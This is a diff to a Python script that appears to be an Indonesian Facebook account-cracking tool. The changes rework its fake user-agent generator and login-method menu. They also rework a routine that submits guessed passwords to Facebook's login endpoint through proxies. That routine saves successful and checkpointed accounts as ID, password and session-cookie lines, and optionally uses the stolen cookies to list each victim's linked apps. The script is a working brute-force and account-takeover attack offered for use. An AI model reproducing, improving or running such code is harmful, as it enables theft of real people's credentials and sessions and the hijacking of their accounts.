@@ -31,24 +31,23 @@ try:
 except Exception as e:
     exit(e)
 for xd in range(10000):
-    a='Mozilla/5.0 (Linux; Android 4.4.2;'
+    a='Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'
     b=random.randrange(1, 9)
     c=random.randrange(1, 9)
-    d='Dragon Touch M10X'
+    d='Nokia'
     e=random.randrange(100, 9999)
-    f='Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) Windows NT 6.1; rv:31.0) Gecko/'
     g=random.randrange(1, 9)
     h=random.randrange(1, 4)
     i=random.randrange(1, 4)
     j=random.randrange(1, 4)
-    k='Safari/537.36'
+    k='Firefox/31.0'
     uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
     ugen2.append(uaku)
 
-
     aa='Mozilla/5.0 (Linux; Android 9;'
     b=random.choice(['6','7','8','9','10','11','12'])
-    c='TONE e20)'
+    c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -58,39 +57,8 @@ for xd in range(10000):
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
-    uaku=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen2.append(uaku)
-    
-    
-    aa='Mozilla/5.0 (Symbian/3; Series60/'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c='Nokia'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/535.1'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
-    
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c=' en-us; Droid'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/533.1'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
+    ugen.append(uaku2)    
     
 def uaku():
 	try:
@@ -488,8 +456,8 @@ def crack_file():
 def setting():
 	print('')
 	print(f'{P}01. join id{M}  OLD=NEW')
-	print(f'{P}02. join id {H} NEW=OLD')
-	print(f'{P}03. join id {H} RANDOM ID')
+	print(f'{P}02. join id {H} NEW=OLD{H}(disarankan)')
+	print(f'{P}03. join id {H} RANDOM ID{H}(Recommended)')
 	print('')
 	hu = input(f'{P}({H}+{P}) ADD ID CRAK : ')
 	if hu in ['1','01']:
@@ -515,18 +483,18 @@ def setting():
 		print('')
 		
 	print('')
-	print(f'{P}1.join metode {B}m.facebook.com{H}(disarankan)\n{P}2.join metode {B}free.facebook.com{H}(Kartu Free Fb)\n{P}3.join metode {B}mbasic.facebook')
+	print(f'{P}1.join metode {B}Touch.facebook.com\n{P}2.join metode {B}Free.facebook.com\n{P}3.join metode {B}M.facebook{H}(disarankan)')
 	print('')
 	hc = input(f'{P}({H}+{P}) ADD METODE : ')
 	wel='# ADD PASWORD MANUAL? y/t'
 	cik2=mark(wel ,style='cyan')
 	sol().print(cik2)
 	if hc in ['1','01']:
-		method.append('mobile')
+		method.append('Touch')
 	elif hc in ['2','02']:
 		method.append('free')
 	elif hc in ['3','03']:
-		method.append('mbasic')
+		method.append('mobile')
 	else:
 		method.append('mobile')
 	pwplus=input(f'{P}({H}+{P}) JAWABAN : ')
@@ -574,11 +542,11 @@ def passwrd():
 					for xpwd in pwnya:
 						pwv.append(xpwd)
 				else:pass
-				if 'mobile' in method:
+				if 'Touch' in method:
 					pool.submit(crack,idf,pwv)
 				elif 'free' in method:
 					pool.submit(crackfree,idf,pwv)
-				elif 'mbasic' in method:
+				elif 'mobile' in method:
 					pool.submit(crackmbasic,idf,pwv)
 				else:
 					pool.submit(crack,idf,pwv)
@@ -685,29 +653,56 @@ def crackmbasic(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r├── Email  : {kk}{idf}{P}          \n│   └──  Sandi  : {kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}           \n')
+				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				kukis = kuki.replace(f'c_user={idf};datr','sb')
-				print(f'\r├── Email  : {hh}{idf}{P}          \n│   └──  sandi  : {hh}{pw}          {P}\n└──  Cookie : {hh}{kukis}{P}\n')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-				#cek_apk(kuki)
-				break
-				
+				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
+				if 'no' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}{N}')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					#os.popen('play-audio data/ok.mp3')
+					break
+				elif 'ya' in taplikasi:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					user=idf
+					infoakun = ""
+					session = requests.Session()
+					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
+					nok=1
+					for muncul in apkaktif:
+						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
+						nok+=1
+
+					hit=0
+					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
+					hit=0
+					for muncul in apkexp:
+						hit+=1
+						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
+					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
+					#os.popen('play-audio data/ok.mp3')
+					ok+=1
+					break
+
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(1)
 	loop+=1
 def cek_apk(kukis):
 	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
+	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -716,7 +711,7 @@ def cek_apk(kukis):
 			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
 		print ("\r      %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
+	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
